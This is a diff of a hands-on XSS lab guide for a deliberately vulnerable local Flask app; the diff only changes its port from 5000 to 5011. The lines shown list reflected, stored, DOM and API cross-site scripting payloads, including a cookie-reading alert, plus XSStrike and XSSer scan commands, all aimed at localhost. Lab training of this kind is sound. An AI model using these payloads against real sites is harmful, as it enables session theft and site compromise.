@@ -43,14 +43,14 @@ WORKDIR /app
 COPY xss_app.py .
 RUN pip install flask
 
-EXPOSE 5000
+EXPOSE 5011
 CMD ["python", "xss_app.py"]
 ```
 
 ```bash
 # Build and run
 docker build -t websploit-xss .
-docker run -p 5000:5000 websploit-xss
+docker run -p 5011:5011 websploit-xss
 ```
 
 ## 🔍 Understanding XSS
@@ -73,7 +73,7 @@ docker run -p 5000:5000 websploit-xss
 ### Phase 1: Application Reconnaissance
 
 #### 1.1 Map Application Endpoints
-Navigate to `http://localhost:5000` and identify all input points:
+Navigate to `http://localhost:5011` and identify all input points:
 
 - **Search Page** (`/search`) - Query parameter
 - **Profile Page** (`/profile`) - User and bio parameters  
@@ -126,13 +126,13 @@ Test the search page at `/search?q=PAYLOAD`:
 
 ```bash
 # Basic reflection test
-http://localhost:5000/search?q=<script>alert('Reflected_XSS')</script>
+http://localhost:5011/search?q=<script>alert('Reflected_XSS')</script>
 
 # Event handler payload
-http://localhost:5000/search?q=<img src=x onerror=alert('Search_XSS')>
+http://localhost:5011/search?q=<img src=x onerror=alert('Search_XSS')>
 
 # Multiple parameter test
-http://localhost:5000/search?q=<script>alert('XSS')</script>&type=<script>alert('Type_XSS')</script>
+http://localhost:5011/search?q=<script>alert('XSS')</script>&type=<script>alert('Type_XSS')</script>
 ```
 
 #### 3.2 Profile Page Testing
@@ -140,13 +140,13 @@ Test the profile page at `/profile?user=PAYLOAD&bio=PAYLOAD`:
 
 ```bash
 # Username parameter XSS
-http://localhost:5000/profile?user=<script>alert('User_XSS')</script>
+http://localhost:5011/profile?user=<script>alert('User_XSS')</script>
 
 # Bio parameter XSS
-http://localhost:5000/profile?bio=<img src=x onerror=alert('Bio_XSS')>
+http://localhost:5011/profile?bio=<img src=x onerror=alert('Bio_XSS')>
 
 # Combined payload
-http://localhost:5000/profile?user=admin&bio=<svg onload=alert('Profile_Compromised')>
+http://localhost:5011/profile?user=admin&bio=<svg onload=alert('Profile_Compromised')>
 ```
 
 #### 3.3 Admin Panel Testing
@@ -154,13 +154,13 @@ Test the admin panel with reflected XSS:
 
 ```bash
 # Session parameter XSS
-http://localhost:5000/admin?session=<script>alert('Admin_Session_XSS')</script>
+http://localhost:5011/admin?session=<script>alert('Admin_Session_XSS')</script>
 
 # Debug parameter XSS
-http://localhost:5000/admin?debug=<img src=x onerror=alert('Debug_XSS')>
+http://localhost:5011/admin?debug=<img src=x onerror=alert('Debug_XSS')>
 
 # Combined admin compromise
-http://localhost:5000/admin?session=admin123&debug=<script>document.body.style.background='red'</script>
+http://localhost:5011/admin?session=admin123&debug=<script>document.body.style.background='red'</script>
 ```
 
 ### Phase 4: Stored XSS Testing
@@ -211,7 +211,7 @@ Test DOM manipulation vulnerabilities at `/messages`:
 
 ```html
 <!-- URL fragment XSS -->
-http://localhost:5000/messages#msg=<img src=x onerror=alert('DOM_XSS')>&to=victim
+http://localhost:5011/messages#msg=<img src=x onerror=alert('DOM_XSS')>&to=victim
 
 <!-- JavaScript injection through form -->
 Recipient: <script>alert('DOM_Recipient')</script>
@@ -239,13 +239,13 @@ Test the widget endpoint with different contexts:
 
 ```bash
 # JavaScript context XSS
-http://localhost:5000/widget?title=Test&callback=alert('Callback_XSS')
+http://localhost:5011/widget?title=Test&callback=alert('Callback_XSS')
 
 # HTML attribute context
-http://localhost:5000/widget?title=" onmouseover="alert('Title_XSS')" "
+http://localhost:5011/widget?title=" onmouseover="alert('Title_XSS')" "
 
 # JSON context
-http://localhost:5000/widget?config={"test": "value", "xss": "<script>alert('JSON_XSS')</script>"}
+http://localhost:5011/widget?config={"test": "value", "xss": "<script>alert('JSON_XSS')</script>"}
 ```
 
 #### 6.2 API Endpoint Testing
@@ -253,10 +253,10 @@ Test JSON API responses:
 
 ```bash
 # Search API XSS
-curl "http://localhost:5000/api/search?q=<script>alert('API_XSS')</script>"
+curl "http://localhost:5011/api/search?q=<script>alert('API_XSS')</script>"
 
 # Profile API XSS
-curl "http://localhost:5000/api/profile/testuser?bio=<img src=x onerror=alert('API_Profile_XSS')>"
+curl "http://localhost:5011/api/profile/testuser?bio=<img src=x onerror=alert('API_Profile_XSS')>"
 ```
 
 ## 🎯 Advanced XSS Techniques
@@ -371,10 +371,10 @@ cd XSStrike
 pip install -r requirements.txt
 
 # Test specific endpoint
-python xsstrike.py -u "http://localhost:5000/search?q=test"
+python xsstrike.py -u "http://localhost:5011/search?q=test"
 
 # Crawl and test
-python xsstrike.py -u "http://localhost:5000" --crawl
+python xsstrike.py -u "http://localhost:5011" --crawl
 ```
 
 #### XSSer
@@ -383,7 +383,7 @@ python xsstrike.py -u "http://localhost:5000" --crawl
 pip install xsser
 
 # Test endpoint
-xsser -u "http://localhost:5000/search?q=XSS"
+xsser -u "http://localhost:5011/search?q=XSS"
 ```
 
 ## 💥 Impact Demonstration
@@ -463,7 +463,7 @@ fetch('/admin', {
 
 ```bash
 # Navigate to:
-http://localhost:5000/search?q=<script>alert('Reflected_XSS_Found')</script>
+http://localhost:5011/search?q=<script>alert('Reflected_XSS_Found')</script>
 
 # Expected Result: Alert popup appears
 # Impact: Immediate script execution from URL parameter
@@ -486,7 +486,7 @@ Comment: <img src=x onerror=alert('Stored_XSS_Persistent')>
 
 ```bash
 # Navigate to:
-http://localhost:5000/messages#msg=<img src=x onerror=alert('DOM_XSS_Fragment')>&to=admin
+http://localhost:5011/messages#msg=<img src=x onerror=alert('DOM_XSS_Fragment')>&to=admin
 
 # Expected Result: Alert popup from JavaScript processing
 # Impact: Client-side execution without server involvement
@@ -497,7 +497,7 @@ http://localhost:5000/messages#msg=<img src=x onerror=alert('DOM_XSS_Fragment')>
 
 ```bash
 # Navigate to:
-http://localhost:5000/admin?debug=<script>alert('Admin_Compromised:'+document.cookie)</script>
+http://localhost:5011/admin?debug=<script>alert('Admin_Compromised:'+document.cookie)</script>
 
 # Expected Result: Alert showing admin session data
 # Impact: Administrative access compromise
@@ -508,7 +508,7 @@ http://localhost:5000/admin?debug=<script>alert('Admin_Compromised:'+document.co
 
 ```bash
 # Test API endpoint:
-curl "http://localhost:5000/api/search?q=<script>alert('API_XSS')</script>"
+curl "http://localhost:5011/api/search?q=<script>alert('API_XSS')</script>"
 
 # Check if script appears in JSON response
 # Impact: Affects applications consuming API data
